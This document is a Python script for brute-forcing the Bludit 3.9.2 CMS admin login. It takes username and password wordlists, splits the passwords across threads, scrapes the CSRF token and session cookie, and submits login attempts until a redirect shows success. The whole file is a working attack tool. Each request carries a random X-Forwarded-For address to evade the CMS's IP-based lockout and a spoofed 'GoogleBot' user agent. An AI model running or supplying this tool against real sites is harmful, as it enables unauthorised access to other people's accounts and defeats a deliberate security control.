#!/usr/bin/env python3

import os
import random
from re import search as research
from http import client
from time import sleep
import itertools
import threading
import argparse
import base64

# don't modify this variables
credentials = ""
attempts = 0
percent = 0
total = 0

def banner():
    print(base64.b64decode(b"ICAgICAgICAgIC8gICAgICAgICAgIC8gICAKICAgICAgICAgLycgLiwsLCwgIC4vICAgICAgIAogICAgICAgIC8nOycgICAgICwvICAgICAgICAKICAgICAgIC8gLyAgICwsLy8sYCdgICAgICAKICAgICAgKCAsLCAnXywgICwsLCcgYGAgICAKICAgICAgfCAgICAvQCAgLCwsIDsiIGAgICAgICAgX18gICAgX18gICAgICAgICAgX19fIF9fICAgICAgICBfXyAgICAgICAgICAgICAgIF9fICAgICAKICAgICAvICAgIC4gICAsJycvJyBgLGBgICAgICAvIC9fICAvIF9fICBfX19fX18vIChfLyAvXyAgICAgIC8gL18gIF9fX19fX18gIF9fLyAvX19fXyAKICAgIC8gICAuICAgICAuLywgYCwsIGAgOyAgIC8gX18gXC8gLyAvIC8gLyBfXyAgLyAvIF9fX19fX19fLyBfXyBcLyBfX18vIC8gLyAvIF9fLyBfIFwKICwuLyAgLiAgICwtLCcsYCAsLC8nJ1wsJyAgLyAvXy8gLyAvIC9fLyAvIC9fLyAvIC8gL18vX19fX18vIC9fLyAvIC8gIC8gL18vIC8gL18vICBfXy8KfCAgIC87IC4vLCwnYCwsJycgfCAgIHwgICAvXy5fX18vXy9cX18sXy9cX18sXy9fL1xfXy8gICAgIC9fLl9fXy9fLyAgIFxfXyxfL1xfXy9cX19fLyAKfCAgICAgLyAgICcsJyAgICAvICAgIHwgICAKIFxfX18vJyAgICcgICAgIHwgICAgIHwgIAogIGAsLCcgICB8ICAgICAgLyAgICAgYFwgIAogICAgICAgIC8gICAgICB8ICAgICAgICB+XCAgCiAgICAgICAnICAgICAgICggICAgICAgICAgCiAgICAgIDogICAgICAgICAgICAgICAgICAgIAogICAgIDsgLiAgICAgICAgIFwgICAgICBieSBtaW5kMmhleCAgIAogICAgOiAgIFwgICAgICAgICA7ICAgICAKICAgICAgIC4gICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==").decode())

def argument_parser():
    parser = argparse.ArgumentParser(prog="bludit_3.9.2-bruteforce.py",
                                     usage="./bludit_3.9.2-brutefoce.py [--path|-p|-t|-T] {-s} {-U} {-P}")
    parser.add_argument("--host",default="localhost",type=str,required=True,help="specify server to connect",metavar="")
    parser.add_argument("--path",default="/bludit/admin/",type=str,help="specify bludit login path... default[/bludit/admin/]",metavar="")
    parser.add_argument("-p","--port",default=80,type=int,help="specify port...  Default[p:80]",metavar="")
    parser.add_argument("-U","--username",type=str,required=True,help="specify username. It can be a username or a path",metavar="")
    parser.add_argument("-P","--password",type=str,required=True,help="specify password. It can be a password or a path",metavar="")
    parser.add_argument("-t","--threads",default=1,type=int,help="specify threads... Default[t:1]",metavar="")
    parser.add_argument("-T","--timeout",type=int,help="specify timeout in seconds... Default[30]",metavar="")
    args = parser.parse_args()
    return args

def argument_checker(args):
    global attempts,total
    wordlistpair = argument_checker_wordlist(args.username,args.password)
    wordlistpair[1] = argument_checker_wordlistsplitter(wordlistpair[1],args.threads)
    print(" %3s %3s %8s  | %-40s"%("Thr","%%%","Attempts","Credentials"))
    for username in wordlistpair[0]:
        attempts = 0
        for key in wordlistpair[1].keys():
            HTTPHandler = client.HTTPConnection(args.host,args.port)
            HTTPHandler.connect()
            HTTPHandler,cookie,token = argument_checker_host(HTTPHandler,args.host,args.path) 
            thread = threading.Thread(target=login_thread, args=(HTTPHandler, username,wordlistpair[1][key],args.host,args.port,args.timeout,args.path,token,cookie))
            thread.start()
        while threading.active_count() > 1:
            sleep(3)
            
def argument_checker_wordlist(username,password):    
    wordlistpair = [username,password]
    for i in range(2):
        if type(wordlistpair[i]) == list:
            continue
        if os.path.isfile(wordlistpair[i]):
            wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
        wordlistpair[i] = wordlistpair[i].split("\n")
    return wordlistpair

def argument_checker_wordlistsplitter(wordlist,threads):
    global total
    pswdict = dict()
    aux1 = aux2 = aux3 = 0
    width = (len(wordlist)-1)//threads
    total = len(wordlist)
    for i in itertools.count(width,width):  # dividing pass wordlist per threads
        if i >= (len(wordlist)-1):
            i = i-(i-(len(wordlist)-1))
            aux3 = 1
        pswdict[aux1] = wordlist[aux2:i]
        aux1 += 1
        aux2 = i
        if aux3 == 1:
            break
    del aux1,aux2,aux3,width
    return pswdict

def argument_checker_host(HTTPHandler,host,path):
    header = {
        "Host":host,
        "User-Agent":"GoogleBot",
        "Connection":"KeepAlive",
        }
    HTTPHandler.request("GET",path,headers=header)
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("argument_checker_host","host seems down")

    try:
        token = research('input.+?name="tokenCSRF".+?value="(.+?)"', response.read().decode()).group(1)
        cookie = response.getheader("Set-Cookie").split(";")[0]
    except:
        ERROR("argument_checker_host","bludit cookie and token doesn't found")

    return HTTPHandler,cookie,token

def login_thread(HTTPHandler, username, pswdict, host, port, timeout, path, token, cookie):
    global credentials,percent,attempts,total
    for password in pswdict:
        if len(credentials) > 0:
            exit()
        bodydata = "tokenCSRF={}&username={}&password={}&save=".format(token,username,password)
        header = {
            "Host":host,
            "User-Agent":"GoogleBot",
            "X-Forwarded-For":random_ip_generator(),
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-length":len(bodydata),
            "DNT":"1",
            "Connection":"close",
            "Cookie":cookie
        }
        print(" %03d %03d %08d  | %s:%-40s"%(threading.active_count(),percent,attempts,username,password),end="\r")
        attempts += 1
        percent = (attempts*100)//total
        try:
            token = POST_request(HTTPHandler,header,bodydata,path)
        except:
            print("[*] Error: %s:%s%40s"%(username,password," "))
            break
        if token == True:
            print(f"\n\n[!] FOUND: {username}:{password}")
            credentials = "{}:{}".format(username,password)
            exit()
        elif token == False:
            print("[*] Unable to get token...")
        else:
            continue
        
def random_ip_generator():
    return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
                                random.randint(10,255), random.randint(10,255))        

def POST_request(HTTPHandler, head:dict, data, path):
    """ try to loging, if sucess return true, else return token to keep trying"""
    HTTPHandler.request("POST",path,body=data,headers=head)
    response = HTTPHandler.getresponse()

    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',response.read().decode())
    new_path = response.getheader("Location")
    if new_path != None:
        return True
    elif token == None:
        print("\n[!] No token found...")
        return False
    else:
        token = token.group(1)
        return token    

def ERROR(msg1,msg2):
    """
    msg1 = location
    msg2 = reason
    """
    print("==================")
    print("#### ERROR #######")
    print("[X] {}".format(msg1))
    print("[X] {}".format(msg2))
    print("==================")
    exit()

    
if __name__ == "__main__":
    banner()
    args = argument_parser()
    argument_checker(args)
    exit()
                    
